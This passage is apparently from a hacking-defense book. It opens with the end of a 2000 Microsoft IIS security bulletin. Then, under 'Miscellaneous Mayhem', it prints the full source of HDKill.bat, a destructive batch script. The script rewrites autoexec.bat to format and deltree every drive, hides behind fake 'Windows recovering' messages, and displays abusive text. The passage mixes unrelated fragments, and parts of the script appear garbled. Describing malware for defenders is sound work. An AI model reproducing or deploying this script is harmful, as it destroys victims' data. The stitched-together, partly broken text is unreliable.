
## Affected Software Versions

- Microsoft Internet Information Server, version 3.0 and 4.0, on x86 and Alpha platforms.

## What Customers Should Do

The attached patch for this vulnerability is fully supported and should be applied immediately, as all systems are determined to be at risk of attack. Microsoft recommends that customers evaluate the degree of risk that this vulnerability poses to their systems, based on physical accessibility, network, and Internet connectivity, and other factors.

## Obtaining Support on This Issue

This is a supported patch. If you have problems installing this patch, or require technical assistance with this patch, please contact Microsoft Technical Support. For information on contacting Microsoft Technical Support, please see http://support.microsoft.com/support/contact/default.asp.

## Revisions

- October 10, 2000: Bulletin Created

For additional security-related information about Microsoft products, please visit http://www.microsoft.com/security.

THE INFORMATION PROVIDED IN THE MICROSOFT KNOWLEDGE BASE IS PROVIDED "AS-IS" WITHOUT WARRANTY OF ANY KIND. MICROSOFT DISCLAIMS ALL WARRANTIES, EITHER EXPRESS OR IMPLIED, INCLUDING THE WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. IN NO EVENT SHALL MICROSOFT CORPORATION OR ITS SUPPLIERS BE LIABLE FOR ANY DAMAGES WHATSOEVER INCLUDING DIRECT, INDIRECT, INCIDENTAL, CONSEQUENTIAL, LOSS OF BUSINESS PROFITS OR SPECIAL DAMAGES, EVEN IF MICROSOFT CORPORATION OR ITS SUPPLIERS HAVE BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES. SOME STATES DO NOT ALLOW THE EXCLUSION OR LIMITATION OF LIABILITY FOR CONSEQUENTIAL OR INCIDENTAL DAMAGES SO THE FOREGOING LIMITATION MAY NOT APPLY.

(c) 2000 Microsoft Corporation. All rights reserved. Terms of Use.

You have received this email bulletin as a result of your registration to the Microsoft Product Security Notification Service. You may unsubscribe from this email notification service at any time by sending an email to MICROSOFT_SECURITY-SIGNOFF-REQUEST@ANNOUNCE.MICROSOFT.COM. The subject line and message body are not used in processing the request, and can be anything you like.

For more information on the Microsoft Security Notification Service please visit http://www.microsoft.com/security/bulletin.htm. For security-related information about Microsoft products, please visit the Microsoft Security Advisor Web site at http://www.microsoft.com/security.

## Step 3: Another Successful Victim

During this step, the attacker simply waits a few days before exercising complete remote control with the phAse zero client, as shown in Figure 10.13.

## Miscellaneous Mayhem

### Windows 3x, 9x, 2000

- **Hack State**: Hard drive obliteration.
- **File**: HDKill.bat.
- **Synopsis**: Some hackers enjoy generating havoc among their victims. This nasty hard-drive killer, for example, has been attached to countless emails, and distributed with game evaluations as a ReadMe.bat file. In other cases, hackers go to the trouble of breaking into systems only to add this file to the system bootup process. Careful inspection of the code will reveal its purpose.

![](img/ba85bb40c695c02adae8cbd6666f2e0c_588_0.png)

**Figure 10.13** Complete control with phAse Zero.

### Hdkill.bat

```batch
@echo off
:start
cls
echo PLEASE WAIT WHILE PROGRAM LOADS...
call attrib -r -h c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo call format c: /q /u /autotest >nul >>c:\autoexec.bat
call attrib +r +h c:\autoexec.bat >nul
set drive=
set alldrive=c d e f g h i j k l m n o p q r s t u v w x y z
echo @echo off >drivechk.bat
echo @prompt %%%%comspec%%%% /f /c vol %%%1: $b find "Vol" > nul > {t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 goto enddc >>drivechk.bat
echo PLEASE WAIT WHILE PROGRAM LOADS...
echo @prompt %%%%comspec%%%% /f /c dir %%%1:..\ad/w/ - p $b find "bytes" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 goto enddc >>drivechk.bat
cls
echo PLEASE WAIT WHILE PROGRAM LOADS...
echo @prompt dir %%%1:..\ad/w/ - p $b find "0 bytes free" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 set drive=%drive% %1 >>drivechk.bat
cls
echo PLEASE WAIT WHILE PROGRAM LOADS...
echo :enddc >>drivechk.bat
:testdrv
for %a in (%alldrive%) do call drivechk.bat %a >nul
del drivechk.bat >nul
:form_del
call attrib -r -h c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system... >>c:\autoexec.bat
echo for %%%a in (%drive%) do call format %%%a: /q /u /autotest > nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system....   >>>c:\autoexec.bat
echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a Bunga >nul
  >>>c:\autoexec.bat
echo cls >>>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system....   >>>c:\autoexec.bat
echo for %%%%a in (%drive%) do call deltree /y %%%%a:\ >nul
  >>>c:\autoexec.bat
echo cls >>>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system....   >>>c:\autoexec.bat
echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autotest >nul
  >>>c:\autoexec.bat
echo cls >>>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system....   >>>c:\autoexec.bat
echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a Bunga >nul
  >>>c:\autoexec.bat
echo cls >>>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system....   >>>c:\autoexec.bat
echo for %%%%a in (%drive%) call deltree /y %%%%a:\ >nul
  >>>c:\autoexec.bat
echo cd\ >>>c:\autoexec.bat
echo cls >>>c:\autoexec.bat
echo echo Welcome to the land of death. Munga Bunga's Multiple Hard Drive Killer version 4.0. >>>c:\autoexec.bat
echo echo If you ran this file, then sorry, I just made it. The purpose of this program is to tell you the following... >>>c:\autoexec.bat
echo echo 1. To make people aware that security should not be taken for granted. >>>c:\autoexec.bat
echo echo 2. Love is important, if you have it, truly, don't let go of it like I did! >>>c:\autoexec.bat
echo echo 3. If you are NOT a vegetarian, then you are a murderer, and I'm glad your HD is dead. >>>c:\autoexec.bat
echo echo 4. If you are Australian, I feel sorry for you, accept my sympathy, you retard. >>>c:\autoexec.bat
echo echo 5. Don't support the following: War, Racism, Drugs and the Liberal Party.>>>c:\autoexec.bat
echo echo. >>>c:\autoexec.bat
echo echo Regards, >>>c:\autoexec.bat
echo echo. >>>c:\autoexec.bat
echo echo Munga Bunga >>>c:\autoexec.bat
call attrib +r +h c:\autoexec.bat

:mkdir
if exist c:\temp.bat attrib -r -h c:\temp.bat >nul
echo @echo off >c:\temp.bat
echo %~1> >>c:\temp.bat
echo cd\ >>c:\temp.bat

echo :startmd >c:\temp.bat
echo for %%%%a in ("if not exist %%2\nul md %%2" "if exist %%2\nul cd %%2") do %%%%a >>c:\temp.bat
echo for %%%%a in (">ass_hole.txt") do echo %%%%a Your Gone @@$hole >>> c:\temp.bat
echo if not exist
echo %%1\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\ %%%2\\ %%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2\%%%2 c l\%%%2\%%%2\%%%2\%%%2\nul goto startmd >>c:\temp.bat
call attrib +r +h c:\temp.bat >nul
cls
echo Initializing Variables...
for %%a in (%drive%) do call format %%a: /q /u /autotest >nul
cls
echo Initializing Variables...
echo Validating Data...
for %%a in (%drive%) do call c:\temp.bat %%a Munga >nul
cls
echo Initializing Variables...
echo Validating Data...
echo Analyzing System Structure...
for %%a in (%drive%) call attrib -r -h %%a:\ /S >nul
call attrib +r +h c:\temp.bat >nul
call attrib +r +h c:\autoexec.bat >nul
cls
echo Initializing Variables...
echo Validating Data...
echo Analyzing System Structure...
echo Initializing Application...
for %%a in (%drive%) call deltree /y %%a:\*. >nul
cls
echo Initializing Variables...
echo Validating Data...
echo Analyzing System Structure...
echo Initializing Application...
echo Starting Application...
for %%a in (%drive%) do call c:\temp.bat %%a Munga >nul
cls
echo Thank you for using a Munga Bunga product.
echo.
echo Oh and, Bill Gates rules, and he is not a geek, he is a good looking genius.
echo.
echo Here is a joke for you...
```
